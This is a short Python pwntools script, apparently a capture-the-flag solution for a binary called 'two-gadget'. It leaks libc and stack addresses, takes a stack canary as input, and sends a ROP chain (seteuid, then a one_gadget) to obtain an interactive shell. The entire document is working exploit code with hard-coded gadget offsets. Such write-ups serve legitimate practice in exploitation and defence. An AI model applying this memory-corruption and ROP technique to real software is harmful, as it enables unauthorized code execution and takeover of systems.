from pwn import *
context.arch = 'amd64'

elf = ELF('./two-gadget')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


p = elf.process()
# p = remote('chals1.eof.ais3.org', 45126)

p.recvuntil(b'Gift: ')
libc_leak = int(p.recvline()[:-1], 16)
libc_base = libc_leak - libc.symbols['setvbuf']
# print(hex(libc_base))
libc.address = libc_base

ret = libc_base + 0x0000000000025679
p.send(p64(ret))
p.send(p64(libc.symbols['environ']))
stack_leak = u64(p.recvuntil(b'\x00\x00'))
print(hex(stack_leak))
ret_addr = stack_leak - 0x100

buf = ret_addr - 0x1000
pop_rdi = 0x0000000000026b72 + libc_base
pop_rsi = 0x0000000000027529 + libc_base
pop_rdx_r12 = 0x000000000011c371 + libc_base
one_gadget = 0xe6c7e + libc_base
print(hex(one_gadget))

canary = int(input(), 16)
rbp = buf
ropc = flat([
    rbp,
    libc.symbols['seteuid'],
    one_gadget
])

payload = b'a' * 8 + p64(canary) + ropc
p.send(payload)

p.interactive()